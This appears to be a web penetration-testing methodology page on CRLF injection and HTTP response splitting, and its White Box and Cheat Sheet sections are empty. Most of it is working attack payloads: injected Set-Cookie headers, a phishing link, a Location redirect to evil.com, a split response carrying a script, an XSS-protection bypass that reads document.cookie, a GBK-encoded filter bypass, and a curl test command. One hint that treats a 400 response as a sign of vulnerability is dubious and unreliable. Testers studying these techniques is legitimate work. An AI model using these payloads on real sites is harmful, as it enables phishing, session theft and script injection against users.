# HTTP Splitting Smuggling

## Check List

## Methodology

### Black Box

#### Basic CRLF Injection

{% stepper %}
{% step %}
Modify the query parameter by injecting a CRLF sequence to add a custom header

```http
GET /page?input=home%0d%0aSet-Cookie:crlf=injected
```
{% endstep %}

{% step %}
Check the response headers for the injected Set-Cookie: crlf=injected. If present, the endpoint is vulnerable

{% hint style="info" %}
The important thing is that if you inject the payload and get a 400 in response, it can indicate that the server is vulnerable, but if it gives a 404 in response, it means that the server is not vulnerable
{% endhint %}
{% endstep %}
{% endstepper %}

***

#### Cookie Injection

{% stepper %}
{% step %}
Inject a CRLF sequence to manipulate cookies

```http
GET /page?input=home%0d%0aSet-Cookie:hacked=true
```
{% endstep %}

{% step %}
Verify if the response includes the injected cookie `(hacked=true)` or affects session behavior
{% endstep %}
{% endstepper %}

***

#### Redirection/phishing

{% stepper %}
{% step %}
CRLF Injection can be used to inject links that redirect users to phishing sites

```http
%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fexample.com%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A
```
{% endstep %}

{% step %}
Observe if the browser redirects to phishing page
{% endstep %}
{% endstepper %}

***

#### Open Redirect

{% stepper %}
{% step %}
Inject a Location header to redirect to a malicious site

```http
GET /page?input=home%0d%0aLocation:https://evil.com
```
{% endstep %}

{% step %}
Observe if the browser redirects to https://evil.com
{% endstep %}
{% endstepper %}

***

#### HTTP Response Splitting

{% stepper %}
{% step %}
By injecting %0d%0a (Carriage Return + Line Feed), an attacker can split the server’s HTTP response into two parts. This enables manipulation of headers and body content in unexpected ways

```http
/vulnerable-endpoint?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Unk9vvN!')</script>
```
{% endstep %}

{% step %}
`%0d%0a` → Ends the current header line and A new `HTTP/1.1 200` OK response starts with a malicious script in the body
{% endstep %}
{% endstepper %}

***

#### Test XSS Protection Bypass

{% stepper %}
{% step %}
Inject a payload to disable XSS protections and execute JavaScript

```http
GET /page?input=home%0d%0aX-XSS-Protection:0%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E
```
{% endstep %}

{% step %}
Verify if the response includes X-XSS-Protection: 0 and the script executes
{% endstep %}
{% endstepper %}

***

#### Test GBK-Encoded CRLF Bypass

{% stepper %}
{% step %}
If standard CRLF payloads are blocked, use GBK-encoded characters

```
GET /page?input=home%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=unk9vvn
```
{% endstep %}

{% step %}
Check if the response includes the injected Set-Cookie: crlfinjection=unk9vvn
{% endstep %}
{% endstepper %}

***

#### [CRLF Injection Using cURL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/Files/crlfinjection.txt)

{% stepper %}
{% step %}
Test for CRLF Injection using cURL

```
curl -I "https://target.com/page?input=home%0d%0aSet-Cookie:crlf=injected"
```
{% endstep %}

{% step %}
Check the response headers for set-cookie: crlf=injected

```http
HTTP/2 301
date: Mon, 12 May 2025 12:46:42 GMT
content-type: text/html
location: https://example.com/
set-cookie: crlf=injected; -> vulnerability
```
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
